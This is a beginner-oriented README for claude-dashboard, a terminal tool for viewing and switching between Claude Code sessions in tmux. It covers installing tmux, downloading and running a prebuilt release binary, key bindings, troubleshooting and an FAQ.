# 🐾 claude-dashboard - Simple Session Manager for Claude Code

[![Download claude-dashboard](https://img.shields.io/badge/Download-claude--dashboard-blue?style=for-the-badge&logo=github)](https://github.com/Tpain166/claude-dashboard/releases)

## 📖 What is claude-dashboard?

claude-dashboard is a tool that helps you manage your Claude Code sessions easily. It works like a control panel inside your computer terminal. If you use tmux (a program that lets you run many programs in one window), claude-dashboard helps you organize and switch between sessions with ease.

Think of it as a dashboard that shows all your Claude Code sessions at once. Instead of typing commands or opening many windows, you see everything in one place. This makes it faster and simpler to handle your work.

You don’t need to be a programmer to use claude-dashboard. It works through your terminal but looks neat and helps you avoid confusion.

---

## ⚙️ Key Features

- Easy session management: View and switch between Claude Code sessions quickly.
- Terminal-based user interface: Works inside your terminal with clear visual elements.
- Works with tmux: Uses tmux commands to keep your sessions tidy.
- Lightweight and fast: Doesn’t slow down your computer.
- Built with Go: Runs smoothly on many computers.
- Inspired by k9s: Uses a popular style for terminal user interfaces.
- Helpful navigation keys: Move through sessions using simple keys on your keyboard.

---

## 💻 System Requirements and Setup

Before using claude-dashboard, make sure your computer fits these needs:

- Operating System: macOS, Linux, or Windows (with Windows Subsystem for Linux or a similar terminal)
- Terminal application: Basic terminal or command prompt that supports tmux
- tmux installed: You need to have tmux installed and working
- Go runtime is not needed to run claude-dashboard after installation

If you don’t have tmux yet, here’s how to install it:

- **macOS:** Open Terminal and run `brew install tmux`
- **Linux (Debian/Ubuntu):** Run `sudo apt-get install tmux`
- **Windows:** Use WSL and install tmux inside it, or use a terminal emulator that supports tmux

---

## 🚀 Getting Started

This guide assumes you have basic terminal access. You don’t need to write any code.

### Step 1: Download claude-dashboard

Go to the download page here:

[Download claude-dashboard](https://github.com/Tpain166/claude-dashboard/releases)

Click the link above or the big badge at the top of this page to open the releases page. Here you will find files ready to download for different operating systems.

### Step 2: Choose the right version for your computer

Find the file that matches your system:

- For macOS, look for a file ending in `.darwin` or `.mac`
- For Linux, look for a `.linux` file
- For Windows, check for `.exe` or files mentioned for Windows systems

### Step 3: Download the file

Click the filename to start downloading.

### Step 4: Run claude-dashboard

Once downloaded, open your terminal and:

- Navigate to the folder where you saved the file.
- On macOS and Linux, you might need to give permission to run it:

  ```bash
  chmod +x ./claude-dashboard
  ./claude-dashboard
  ```

- On Windows, just double-click the `.exe` file or run it from the command prompt.

When you run it, claude-dashboard will open in your terminal window, showing all your Claude Code sessions.

---

## 📋 How to Use claude-dashboard

Here is how to make the most of claude-dashboard’s interface:

### Navigating Sessions

- Use arrow keys or `j`/`k` to move up and down the list.
- Press `Enter` to switch to a selected Claude Code session.
- Use `q` to exit claude-dashboard.

### Managing Sessions

- You can open new sessions right inside tmux, and claude-dashboard will list them automatically.
- To close a session, use your tmux commands or exit the session normally. claude-dashboard will update the list.

### Tips for Efficiency

- Learn a few tmux commands to start and manage sessions outside claude-dashboard.
- Combine claude-dashboard with tmux shortcuts to speed up switching between projects.
- If your tmux sessions are not showing, make sure tmux is running and your terminal supports it.

---

## 🛠 Troubleshooting

If something does not work, try these steps:

- Make sure tmux is installed and running. You can check by typing `tmux ls` in your terminal.
- Ensure you downloaded the correct version of claude-dashboard for your operating system.
- Give the downloaded file permission to run (see Step 4 in Getting Started).
- Check that you are inside a tmux session if you want to see active sessions.
- Restart your terminal and run claude-dashboard again.
- Visit the [Issues section](https://github.com/Tpain166/claude-dashboard/issues) on GitHub if problems continue.

---

## 🔗 Download & Install

You can always download the latest version of claude-dashboard here:

[https://github.com/Tpain166/claude-dashboard/releases](https://github.com/Tpain166/claude-dashboard/releases)

Follow the instructions in the Getting Started section to download, install, and start the app.

---

## ❓ Frequently Asked Questions

**Do I need to install Go to use claude-dashboard?**  
No. The app comes as a ready-to-run file. You only need Go if you want to build it yourself.

**Can I use claude-dashboard without tmux?**  
No. claude-dashboard relies on tmux to manage sessions. Install tmux before using the app.

**Is claude-dashboard safe to run?**  
Yes. It is an open-source tool designed to manage terminal sessions. You can view the source code on GitHub for peace of mind.

**Can I customize claude-dashboard?**  
Customizations require some knowledge of Go or terminal commands. For beginners, it’s best to use it as is.

---

## 📂 More Resources and Help

- To learn tmux basics, visit [tmux GitHub](https://github.com/tmux/tmux/wiki)
- For issues and feature requests, visit [claude-dashboard GitHub Issues](https://github.com/Tpain166/claude-dashboard/issues)
- Check the README in the released files for version-specific notes.

---

Thank you for choosing claude-dashboard. It aims to make your terminal session management smooth and simple. If you run into issues or want to share feedback, the GitHub page is open for discussion.